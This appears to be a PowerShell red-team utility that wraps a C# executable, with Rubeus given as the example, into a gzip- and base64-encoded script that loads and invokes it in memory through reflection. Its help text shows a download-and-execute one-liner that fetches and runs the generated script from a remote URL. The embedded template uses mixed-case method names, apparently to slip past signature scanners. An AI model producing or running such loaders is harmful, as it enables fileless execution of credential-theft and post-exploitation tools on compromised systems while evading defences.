<#
.SYNOPSIS
    .
.DESCRIPTION
    Wraps a C# binary into a Powershell Script, gzip and base64 converted.
    Can afterwards be imported with 
    c:\ps>iex(new-object net.webclient).downloadstring("https://yoursite/invoke-whatever.ps1")
    c:\ps>invoke-rubeus -command triage
.PARAMETER Infile
    path to the C# exe file.
.EXAMPLE
    C:\PS> . .\convert_c#_to_ps1.ps1
    C:\PS>invoke-convert -infile c:\temp\rubeus.exe
.NOTES
    Author: Mario H Felix Jr
    Date:   July 7, 2021    
#>$CWD = [Environment]::CurrentDirectory
[Environment]::CurrentDirectory = $PWD

function Invoke-convert
{
[CmdletBinding()] param (
 
      [string] $infile
 
   )

#$outfile = $infile + ".base64.txt"
$a = ".\temp.gz"
$srcFileStream = New-Object System.IO.FileStream($infile,([IO.FileMode]::Open),([IO.FileAccess]::Read),([IO.FileShare]::Read))
$dstFileStream = New-Object System.IO.FileStream($a,([IO.FileMode]::Create),([IO.FileAccess]::Write),([IO.FileShare]::None))
$gzip = New-Object System.IO.Compression.GZipStream($dstFileStream,[System.IO.Compression.CompressionMode]::Compress)
$srcFileStream.CopyTo($gzip)
$gzip.Dispose()
$z = [System.IO.File]::ReadAllBytes($a)
$Base64String = [System.Convert]::ToBase64String($z)
#$Base64String | Out-File $outfile
$Global:b64 = $Base64String 
rm $a
Get-Entrypoint
export   
}


function Get-EntryPoint
{
    #$item = Get-Item -Path $Path
    $file = [Convert]::ToBase64String([IO.File]::ReadAllBytes($infile))
    $Assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($file))
    if ($Assembly.EntryPoint.IsPrivate)
    {
        $Global:line1 = "`n    `$PrivateMethod` = [" + $Assembly.EntryPoint.reflectedtype.namespace + "." + $Assembly.EntryPoint.reflectedtype.name + "].GetMethod('" + $Assembly.EntryPoint.name + "',`$bindingFlags`)"
    }
    else
    {
        $Global:line1 = "`n    `$PrivateMethod` = [" + $Assembly.EntryPoint.reflectedtype.namespace + "." + $Assembly.EntryPoint.reflectedtype.name + "].GetMethod('" + $Assembly.EntryPoint.name + "')"
    }
    $Global:line2 = "`n    if(`$PrivateMethod`){`n      `$PrivateMethod.Invoke(`$Null,@(,`$passed))`n      }`n    else{`n      `$PrivateMethod` = [" + $Assembly.EntryPoint.reflectedtype.namespace + "." + $Assembly.EntryPoint.reflectedtype.name + "].GetMethod('" + $Assembly.EntryPoint.name + "')" + "`n      `$PrivateMethod.Invoke`(`$Null`,@(,`$passed`))`n      }`n "
    $Global:name = $Assembly.EntryPoint.reflectedtype.namespace

}

function export
{
$text = "function Invoke-" + $name
$text += @'
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("
'@
$text += $b64
$text += @'
"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]

    foreach ($args in $Command.Split(" "))
    {
        $vars.Add($args)
    }

    $passed = [string[]]$vars.ToArray()

    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
'@
$text += $line1
$text += "`n"
$text += $line2
$text += @'
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
'@
$outfile = ".\Invoke-" + $name + ".ps1"
$text | out-file $outfile
}
